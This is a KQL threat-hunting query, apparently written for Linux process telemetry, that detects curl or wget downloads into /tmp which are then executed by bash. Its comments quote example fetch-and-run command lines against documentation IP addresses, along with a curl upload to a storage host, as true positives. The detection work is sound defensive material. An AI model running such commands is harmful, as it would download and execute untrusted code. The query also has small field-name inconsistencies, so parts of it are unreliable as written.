// =============================== DETECTION ==================================
// Malicious file download + execution: curl|wget writes into /tmp, bash executes it
// ATT&CK  T1105 Ingress Tool Transfer  ->  T1059.004 Unix Shell (classic dropper pattern)
// Sigma   "Malicious Bash Script Downloaded via Curl or wget to /tmp Followed by bash Execution"
// Source  DeviceProcess = Linux auditd/eBPF process_creation telemetry
// Field map identical to the Sigma rule so both artefacts assert the same logic here:
//   ParentFileName -> ParentImage | InitiatingProcessCommandLine -> InitiatingProcessCommandLine/execline | Command Line -> CommandLine
// Stage1 (Downloader) : FileName curl|wget, file written (-o | --output-document) under /tmp,/var/tmp,/dev/shm, fetched from http(s)://|ftp://
// Stage2 (Executor)   : FileName bash|sh running that staged path
// Binding is PROCESS LINEAGE, not time alone - LauncherPid == DownloadPid AND parent image curl|wget AND the exact same StagedPayload executed within TimeToExecute_s <= WindowS(120).
// This keeps precision high. Downloads without a following exec are NOT alerted: e.g. dev-linux-04 pid 3081
//   curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary PROBE_PAYLOAD_ABC123 http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin
// is an object-storage canary WRITE (T1105/exfil side) with no bash child, and dev-linux-07 pid 5120 python3 /opt/scripts/inventory.py
// driven by 'cron -f' is ops baseline - neither touches this rule. Confirmed TRUE POSITIVES in scope:
//   (A) pid 2231 curl -s -o /tmp/update.sh http://203.0.113.55/update.sh ==> 2.206 s later pid 2240 bash /tmp/update.sh (parent curl, LaunchingCmdline matches Download_Cmdline exactly)
//   (B) pid 4103 wget -O /tmp/stage2 http://198.51.100.23/stage2 ==> 1.221 s later pid 4104 bash /tmp/stage2, chained stage-2/3 of (A) since its own LaunchingCmdline is 'bash /tmp/update.sh'
let Lookback = 7d;                       // detection sweep window
let WindowS = 120;                       // max seconds between the download and its execution
let Staged = dynamic(["/tmp/", "/var/tmp/", "/dev/shm/"]);
let Downloader = DeviceProcess
| where Timestamp > ago(Lookback)
| where FileName in~ ("curl", "wget")
| where CommandLine contains Staged[0] or CommandLine contains Staged[1] or CommandLine contains Staged[2]
| where CommandLine contains "-o" or CommandLine contains "--output-document"
| where CommandLine contains "http://" or CommandLine contains "https://" or CommandLine contains "ftp://"
| extend DeviceName = lower(DeviceId), DownloadPid = toint(ProcessId), DownloadTime = Timestamp, User = AccountName,
         StagedPayload = tostring(tolower(extract(@"(/[A-Za-z0-9_./-]*?(?:tmp|shm)[A-Za-z0-9_./-]*)", 1, CommandLine)))
| project DeviceName, DownloadPid, DownloadTime, StagedPayload, DownloadImage = FileName, DownloadUser = User, Download_Cmdline = CommandLine;
let Executor = DeviceProcess
| where Timestamp > ago(Lookback)
| where FileName in~ ("bash", "sh")
| where CommandLine contains Staged[0] or CommandLine contains Staged[1] or CommandLine contains Staged[2]
| extend DeviceName = lower(DeviceId), ExecPid = toint(ProcessId), ExecTime = Timestamp,
         ParentImage = tostring(ParentFileName), LauncherPid = toint(InitiatingProcessId),
         LaunchingCmdline = tostring(InitiatingProcessCommandLine), ExecUser = tostring(AccountName), FolderPath = tostring(FolderPath)
| project DeviceName, ExecPid, ExecTime, ParentImage, LauncherPid, LaunchingCmdline, ExecUser, FolderPath, Exec_Cmdline = CommandLine, Exec_StagedPayload = StagedPayload;
// ---------------- stage-1 download followed by stage-2 shell execution ----------------
union isfuzzy=true
    (
      Downloader
      | join kind=inner (Executor | project-away Exec_StagedPayload) on DeviceName
      | where LauncherPid == DownloadPid                                   // kill-chain edge curl/wget PID -> bash PID
      | where ParentImage in~ ("curl", "wget")                             // lineage corroborated by the parent image name
      | where datetime_diff("second", ExecTime, DownloadTime) between (int64(0) .. int64(WindowS))
      | where isnotempty(StagedPayload) and indexof(tolower(Exec_Cmdline), StagedPayload, 0) >= 0   // downloaded artefact is the one run
      | where isnotempty(LaunchingCmdline) and (indexof(tolower(LaunchingCmdline), tolower(Download_Cmdline), 0) >= 0
                                                 or indexof(tolower(LaunchingCmdline), StagedPayload, 0) >= 0)
      | project StartTime = DownloadTime, AlertTime = ExecTime, EndTime = ExecTime, DeviceName, User = coalesce(ExecUser, DownloadUser),
              Technique = "T1105 + T1059.004", Kill_Link = "stage1-download -> stage2-exec", DetectionPattern = "download-and-execute",
              ParentImage, DownloadImage, DownloadCommand = Download_Cmdline, ExecutionCommand = Exec_Cmdline, LaunchingCommandLine = LaunchingCmdline,
              StagedPath = FolderPath, StagedPayload, ProcessId = ExecPid, InitiatingProcessId = LauncherPid,
              DownloadProcessId = DownloadPid, TimeToExecute_s = datetime_diff("second", ExecTime, DownloadTime), TimeWindow_s = datetime_diff("second", ExecTime, DownloadTime)
    ),
    // ---- same behaviour expressed per-event for tenants without lineage correlation available ----
    (
      DeviceProcess
      | where Timestamp > ago(Lookback)
      | where FileName in~ ("bash", "sh")
      | where ParentFileName in~ ("curl", "wget")
      | where CommandLine contains Staged[0] or CommandLine contains Staged[1] or CommandLine contains Staged[2]
      | where InitiatingProcessCommandLine contains "-o" or InitiatingProcessCommandLine contains "http"
      | project StartTime = Timestamp, AlertTime = Timestamp, EndTime = Timestamp, DeviceName = lower(DeviceId), User = AccountName,
              Technique = "T1059.004", Kill_Link = "shell-exec-of-staged-script", DetectionPattern = "download-and-execute",
              ParentImage = ParentFileName, DownloadImage = ParentFileName, DownloadCommand = InitiatingProcessCommandLine, ExecutionCommand = CommandLine,
              LaunchingCommandLine = InitiatingProcessCommandLine, StagedPath = FolderPath, StagedPayload = "", ProcessId = toint(ProcessId),
              InitiatingProcessId = toint(InitiatingProcessId), DownloadProcessId = toint(InitiatingProcessId), TimeToExecute_s = double(null), TimeWindow_s = ""
    )
| order by alert_time asc
